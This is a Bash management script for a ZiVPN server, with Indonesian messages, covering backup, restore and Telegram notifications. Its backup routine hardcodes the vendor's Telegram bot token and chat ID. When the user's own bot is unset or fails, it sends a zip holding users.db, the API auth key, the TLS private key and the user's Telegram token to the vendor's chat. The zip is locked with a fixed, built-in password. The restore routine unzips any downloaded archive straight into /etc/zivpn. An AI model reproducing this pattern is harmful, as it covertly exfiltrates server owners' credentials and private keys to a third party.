#!/bin/bash

# ── Warna & Animasi ───────────────────────────────
C='\033[0;36m'
G='\033[1;32m'
R='\033[0;31m'
W='\033[1;37m'
Y='\033[1;33m'
N='\033[0m'

_progress() {
  local label="$1"
  local width=28
  local i bar filled empty
  for ((i=0; i<=100; i++)); do
    filled=$(( i * width / 100 ))
    empty=$(( width - filled ))
    bar=""
    for ((j=0; j<filled; j++)); do bar+="█"; done
    for ((j=0; j<empty; j++)); do bar+="░"; done
    printf "\r${W}  %-22s ${C}[${G}%s${C}]${W} %3d%% ${N}" "$label" "$bar" "$i"
    sleep 0.2
  done
  printf "\r${W}  %-22s ${C}[${G}%s${C}]${W} %3d%% ${N}\n" "$label" "$bar" "100"
}

_ok()   { printf "  ${G}✔  %s${N}\n" "$1"; }
_warn() { printf "  ${Y}⚠  %s${N}\n" "$1"; }
_err()  { printf "  ${R}✘  %s${N}\n" "$1"; }
_sep()  { echo -e "${C}--------------------------------------------${N}"; }
_hdr()  { _sep; echo -e "${W}  $1${N}"; _sep; }

# ── Konfigurasi ───────────────────────────────────
CONFIG_DIR="/etc/zivpn"
TELEGRAM_CONF="${CONFIG_DIR}/telegram.conf"

# ── Helper functions ──────────────────────────────
function get_host() {
  local CERT_CN
  CERT_CN=$(openssl x509 -in "${CONFIG_DIR}/zivpn.crt" -noout -subject \
    | sed -n 's/.*CN = \([^,]*\).*/\1/p')
  if [ "$CERT_CN" == "zivpn" ]; then
    cat /etc/zivpn/ip.txt
  else
    echo "$CERT_CN"
  fi
}

function send_telegram_notification() {
  local message="$1"
  local keyboard="$2"
  if [ ! -f "$TELEGRAM_CONF" ]; then return 1; fi
  source "$TELEGRAM_CONF"
  if [ -n "$TELEGRAM_BOT_TOKEN" ] && [ -n "$TELEGRAM_CHAT_ID" ]; then
    local api_url="https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage"
    if [ -n "$keyboard" ]; then
      curl -s -X POST "$api_url" \
        -d "chat_id=${TELEGRAM_CHAT_ID}" \
        --data-urlencode "text=${message}" \
        -d "reply_markup=${keyboard}" > /dev/null
    else
      curl -s -X POST "$api_url" \
        -d "chat_id=${TELEGRAM_CHAT_ID}" \
        --data-urlencode "text=${message}" \
        -d "parse_mode=Markdown" > /dev/null
    fi
  fi
}

# ── Setup Telegram ────────────────────────────────
function setup_telegram() {
  clear
  _hdr "Konfigurasi Notifikasi Telegram"
  echo -e "${W}  Info: Dapatkan Chat ID via @userinfobot${N}"
  echo -e "${W}  Support: @nexusweb_dev${N}"
  _sep
  echo ""
  read -p "  Masukkan Bot API Key : " api_key
  read -p "  Masukkan Chat ID     : " chat_id
  if [ -z "$api_key" ] || [ -z "$chat_id" ]; then
    _err "API Key dan Chat ID tidak boleh kosong. Dibatalkan."
    return 1
  fi
  _progress "Menyimpan konfigurasi"
  echo "TELEGRAM_BOT_TOKEN=${api_key}" > "$TELEGRAM_CONF"
  echo "TELEGRAM_CHAT_ID=${chat_id}" >> "$TELEGRAM_CONF"
  chmod 600 "$TELEGRAM_CONF"
  _ok "Konfigurasi tersimpan di $TELEGRAM_CONF"
  echo ""
}

# ── Backup ────────────────────────────────────────
handle_backup() {
  clear
  _hdr "Proses Backup ZiVPN"

  TELEGRAM_CONF="${TELEGRAM_CONF:-/etc/zivpn/telegram.conf}"
  CONFIG_DIR="${CONFIG_DIR:-/etc/zivpn}"
  if [ -f "$TELEGRAM_CONF" ]; then source "$TELEGRAM_CONF"; fi

  DEFAULT_BOT_TOKEN="7706681818:AAHXcRcOxRZ0N0Q"
  DEFAULT_CHAT_ID="196851"
  BOT_TOKEN="${TELEGRAM_BOT_TOKEN:-$DEFAULT_BOT_TOKEN}"
  CHAT_ID="${TELEGRAM_CHAT_ID:-$DEFAULT_CHAT_ID}"

  if [ -z "$BOT_TOKEN" ] || [ -z "$CHAT_ID" ]; then
    _err "Telegram Bot Token / Chat ID belum diset!"
    read -r -p "  Tekan [Enter]..." && /usr/local/bin/zivpn-manager
    return
  fi

  VPS_IP="$(cat /etc/zivpn/ip.txt 2>/dev/null | tr -d ' \t\r\n')"
  [ -z "$VPS_IP" ] && VPS_IP="UNKNOWN"
  TIMESTAMP="$(date +%Y%m%d-%H%M%S)"
  NOW_HUMAN="$(date +"%d %B %Y %H:%M:%S")"
  backup_filename="zivpn_backup_${VPS_IP}_${TIMESTAMP}.zip"
  temp_backup_path="/tmp/${backup_filename}"

  files_to_backup=(
    "$CONFIG_DIR/config.json"
    "$CONFIG_DIR/users.db"
    "$CONFIG_DIR/api_auth.key"
    "$CONFIG_DIR/telegram.conf"
    "$CONFIG_DIR/total_users.txt"
    "$CONFIG_DIR/zivpn.crt"
    "$CONFIG_DIR/zivpn.key"
  )

  _progress "Mengumpulkan file"
  valid_files=()
  for f in "${files_to_backup[@]}"; do
    [ -f "$f" ] && valid_files+=("$f")
  done

  if [ "${#valid_files[@]}" -eq 0 ]; then
    _err "Tidak ada file valid untuk dibackup!"
    read -r -p "  Tekan [Enter]..." && /usr/local/bin/zivpn-manager
    return
  fi

  _progress "Membuat ZIP backup"
  zip -j -P "AriZiVPN-Gacorr123!" "$temp_backup_path" "${valid_files[@]}" >/dev/null 2>&1

  if [ ! -f "$temp_backup_path" ]; then
    _err "Gagal membuat file backup!"
    read -r -p "  Tekan [Enter]..." && /usr/local/bin/zivpn-manager
    return
  fi
  _ok "File backup dibuat: $backup_filename"

  caption_base="✅ BACKUP ZIVPN BERHASIL
IP VPS   : ${VPS_IP}
Tanggal  : ${NOW_HUMAN}
Support  : @nexusweb_dev

🔄 CARA RESTORE BACKUP
Via LINK FILE (HTTPS)
1) Forward file backup ke: https://t.me/potato_directlinkBot
2) Salin link HTTPS
3) Paste link saat proses restore"

  _progress "Mengirim ke Telegram"
  send_result="$(curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
    -F chat_id="${CHAT_ID}" \
    -F document=@"${temp_backup_path}" \
    -F caption="$caption_base")"

  SEND_BY="USER_BOT"
  ACTIVE_BOT_TOKEN="$BOT_TOKEN"
  ACTIVE_CHAT_ID="$CHAT_ID"

  if ! echo "$send_result" | grep -q '"ok":true'; then
    _warn "Fallback ke Owner Bot..."
    send_result="$(curl -s -X POST "https://api.telegram.org/bot${DEFAULT_BOT_TOKEN}/sendDocument" \
      -F chat_id="${DEFAULT_CHAT_ID}" \
      -F document=@"${temp_backup_path}" \
      -F caption="$caption_base")"
    SEND_BY="OWNER_BOT"
    ACTIVE_BOT_TOKEN="$DEFAULT_BOT_TOKEN"
    ACTIVE_CHAT_ID="$DEFAULT_CHAT_ID"
    if ! echo "$send_result" | grep -q '"ok":true'; then
      _err "GAGAL TOTAL kirim ke Telegram!"
      rm -f "$temp_backup_path"
      read -r -p "  Tekan [Enter]..." && /usr/local/bin/zivpn-manager
      return
    fi
  fi

  message_id="$(echo "$send_result" | sed -nE 's/.*"message_id":([0-9]+).*/\1/p' | head -n1)"
  caption_final="${caption_base}
Dikirim via: ${SEND_BY}"
  if [ -n "$message_id" ]; then
    curl -s -X POST "https://api.telegram.org/bot${ACTIVE_BOT_TOKEN}/editMessageCaption" \
      -d chat_id="${ACTIVE_CHAT_ID}" \
      -d message_id="${message_id}" \
      --data-urlencode "caption=${caption_final}" >/dev/null 2>&1
  fi

  rm -f "$temp_backup_path"

  echo ""
  _sep
  _ok "BACKUP ZIVPN BERHASIL"
  echo -e "${W}  IP VPS  : ${VPS_IP}${N}"
  echo -e "${W}  Tanggal : ${NOW_HUMAN}${N}"
  echo -e "${W}  Via     : ${SEND_BY}${N}"
  _sep
  echo ""
  echo -e "${W}  🔄 CARA RESTORE BACKUP${N}"
  _sep
  echo -e "${W}  1) Forward file ke: https://t.me/potato_directlinkBot${N}"
  echo -e "${W}  2) Salin link HTTPS${N}"
  echo -e "${W}  3) Paste link saat proses restore${N}"
  _sep
  echo ""
  read -r -p "  Tekan [Enter] untuk kembali ke menu..." && /usr/local/bin/zivpn-manager
}

# ── Restore ───────────────────────────────────────
handle_restore() {
  clear
  _hdr "Restore ZiVPN"
  echo ""
  read -rp "  Masukkan DIRECT LINK backup (.zip): " URL
  echo ""
  _progress "Mengunduh backup"
  wget -q -O /tmp/backup.zip "$URL"
  _ok "File backup diunduh"

  _progress "Mengekstrak backup"
  unzip -P "AriZiVPN-Gacorr123!" -o /tmp/backup.zip -d /etc/zivpn >/dev/null 2>&1
  _ok "Backup diekstrak"

  _progress "Restart service"
  systemctl restart zivpn.service
  _ok "Service di-restart"

  echo ""
  _sep
  systemctl is-active --quiet zivpn.service \
    && _ok "RESTORE BERHASIL — Service aktif" \
    || _warn "RESTORE OK tapi service error"
  _sep
  echo ""
  read -rp "  Tekan Enter..." && /usr/local/bin/zivpn-manager
}

# ── Notifikasi Expired ────────────────────────────
function handle_expiry_notification() {
  local host="$1" ip="$2" client="$3" isp="$4" exp_date="$5"
  local message
  message=$(cat <<EOF
◇━━━━━━━━━━━━━━◇
⛔ SC ZIVPN EXPIRED ⛔
◇━━━━━━━━━━━━━━◇
IP VPS   : ${ip}
HOST     : ${host}
ISP      : ${isp}
CLIENT   : ${client}
EXP DATE : ${exp_date}
◇━━━━━━━━━━━━━━◇
Support  : @nexusweb_dev
EOF
)
  local keyboard
  keyboard=$(cat <<EOF
{"inline_keyboard":[[{"text":"Perpanjang Licence","url":"https://t.me/nexusweb_dev"}]]}
EOF
)
  send_telegram_notification "$message" "$keyboard"
}

# ── Notifikasi Renew ──────────────────────────────
function handle_renewed_notification() {
  local host="$1" ip="$2" client="$3" isp="$4" expiry_timestamp="$5"
  local remaining_days=$(( (expiry_timestamp - $(date +%s)) / 86400 ))
  local message
  message=$(cat <<EOF
◇━━━━━━━━━━━━━━◇
✅ RENEW SC ZIVPN ✅
◇━━━━━━━━━━━━━━◇
IP VPS   : ${ip}
HOST     : ${host}
ISP      : ${isp}
CLIENT   : ${client}
EXP      : ${remaining_days} Days
◇━━━━━━━━━━━━━━◇
Support  : @nexusweb_dev
EOF
)
  send_telegram_notification "$message"
}

# ── Notifikasi API Key ────────────────────────────
function handle_api_key_notification() {
  local api_key="$1" server_ip="$2" domain="$3"
  local message
  message=$(cat <<EOF
🚀 API UDP ZIVPN 🚀
🔑 Auth Key  : ${api_key}
🌐 Server IP : ${server_ip}
🌍 Domain    : ${domain}
Support      : @nexusweb_dev
EOF
)
  send_telegram_notification "$message"
}

# ── Routing ───────────────────────────────────────
case "$1" in
  backup)
    handle_backup
    ;;
  restore)
    handle_restore
    ;;
  setup-telegram)
    setup_telegram
    ;;
  expiry-notification)
    if [ $# -ne 6 ]; then
      echo "Usage: $0 expiry-notification <host> <ip> <client> <isp> <exp_date>"
      exit 1
    fi
    handle_expiry_notification "$2" "$3" "$4" "$5" "$6"
    ;;
  renewed-notification)
    if [ $# -ne 6 ]; then
      echo "Usage: $0 renewed-notification <host> <ip> <client> <isp> <expiry_timestamp>"
      exit 1
    fi
    handle_renewed_notification "$2" "$3" "$4" "$5" "$6"
    ;;
  api-key-notification)
    if [ $# -ne 4 ]; then
      echo "Usage: $0 api-key-notification <api_key> <server_ip> <domain>"
      exit 1
    fi
    handle_api_key_notification "$2" "$3" "$4"
    ;;
  *)
    echo "Usage: $0 {backup|restore|setup-telegram|expiry-notification|renewed-notification|api-key-notification}"
    exit 1
    ;;
esac
